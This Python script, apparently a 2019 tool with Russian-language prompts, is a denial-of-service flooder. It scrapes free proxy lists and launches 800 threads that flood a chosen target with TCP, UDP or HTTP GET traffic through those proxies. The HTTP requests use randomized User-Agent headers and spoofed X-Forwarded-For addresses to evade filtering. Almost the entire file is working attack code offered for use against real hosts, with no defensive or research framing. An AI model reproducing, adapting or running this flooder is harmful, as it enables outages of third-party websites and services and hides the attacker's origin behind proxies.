# -*- coding: utf-8 -*-
import urllib.request
import sys
from scapy.all import *

import socket
import socks
import argparse
import threading
import random
import time


__author__ = "eMae's Dosik | 2019"
sites = ["https://www.socks-proxy.net/","http://free-proxy-list.net/"] 
useragents = []

multiple = 70 
threads = 800 
choice1 = 0 
choice2 = 0 
choice3 = 0 
port = 80 

parser = argparse.ArgumentParser()
parser.add_argument('-useragent', help = 'Путь до файла с user-агентами')
parser.add_argument('-proxylist', help = 'Путь до файла с proxy')
parser.add_argument('-url', help = 'Цель')
parser.add_argument('-getproxy', help = 'Получить прокси? 1 - да | 0 - нет')
args = parser.parse_args()
useragents_file = args.useragent
needproxy = args.getproxy
url = args.url
proxies_list = args.proxylist


handle = open(useragents_file)
for x in handle:
    useragents.append(x)
useragents = map(lambda s: s.strip(), useragents)
useragents = list(useragents)

def getPROXY(urlproxy):
    try:
        req = urllib.request.Request(("{0}").format(str(urlproxy)))
        req.add_header("User-Agent", random.choice(useragents))
        sourcecode = urllib.request.urlopen(req)
        part = str(sourcecode.read())
        part = part.split("<tbody>")
        part = part[1].split("</tbody>")
        part = part[0].split("<tr><td>")
        proxies = ""
        for proxy in part:
            proxy = proxy.split("</td><td>") 
            try:
                proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
            except:
                pass
        handle = open("proxy.txt","a") 
        handle.write("")
        handle.write(proxies)
        handle.close()
        print ("Прокси скачаны успешно!")
    except:
        print ("Ошибка!")

if needproxy == "1": 
    
    for x in sites:
        getPROXY(x)
    
time.sleep(5)
if proxies_list == "": 
    print("Укажи прокси!")
    exit()
if useragents_file == "": 
    print("Укажи useragent-ов!")
    exit()
try:
    proxies = open(proxies_list).readlines() 
except TypeError:
    print("Прокси с файла не считаны!")

def checkURL(): 
    global url
    global url2
    global urlport


    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("Ошибка!")
        exit()

    try:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

    try:
        urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
    except:
        urlport = "80"



def typeflood(): 
    global choice1 
    global choice2
    global choice3

    select = input("UDP или TCP или HTTP? => ")
    if select == "TCP":
        choice1 = "1" 
        choice2 = "y" 
        choice3 = "0" 
    if select == "UDP":
        choice1 = "2"
        choice2 = "y" 
        choice3 = "0"
    if select == "HTTP":
        choice1 = "0"
        choice2 = "y"
        choice3 = "0"


def loop():
    global threads
    global get_host
    global acceptall
    global connection
    global go
    global x

    if choice1 == "0": 
        get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ] 
        connection = "Connection: Keep-Alive\r\n" 
    x = 0 
    go = threading.Event()
    if choice1 == "1": 
        if choice2 == "y":
            if choice3 == "0":
                for x in range(threads):
                    TcpFloodProxed(x+1).start() 
                    print ("Поток " + str(x) + " готов!")
                go.set() 
    else: 
        if choice1 == "2":
            if choice2 == "y":
                if choice3 == "0":
                    for x in range(threads):
                        UdpFloodProxed(x+1).start() 
                        print ("Поток " + str(x) + " готов!")
                    go.set() 
        else: 
            if choice2 == "y":
                if choice3 == "0":
                    for x in range(threads):
                        RequestProxyHTTP(x+1).start() 
                        print ("Поток " + str(x) + " готов!")
                    go.set() 



class TcpFloodProxed(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        data = random._urandom(1024) 
        p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else: 
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) 
                s = socks.socksocket() 
                s.connect((str(url2),int(port))) 
                s.send(p) 
                print ("Запрос отправлен с " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(p)) 
                except: 
                    s.close()
            except:
                s.close() 


class UdpFloodProxed(threading.Thread):  

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        data = random._urandom(1024) 
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)  
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else: 
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) 
                s = socks.socksocket() 
                s.connect((str(url2),int(port))) 
                s.send(p) 
                print ("Запрос отправлен с " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(p)) 
                except: 
                    s.close()
            except:
                s.close() 

class RequestProxyHTTP(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
        accept = random.choice(acceptall) 
        randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward = "X-Forwarded-For: " + randomip + "\r\n" 
        request = get_host + useragent + accept + forward + connection + "\r\n" 
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else:  
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True: 
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                s.connect((str(proxy[0]), int(proxy[1]))) 
                s.send(str.encode(request)) 
                print ("Запрос отправлен с " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(request)) 
                except: 
                    s.close()
            except:
                s.close() 




if __name__ == '__main__': 
    checkURL()
    typeflood()
    loop()
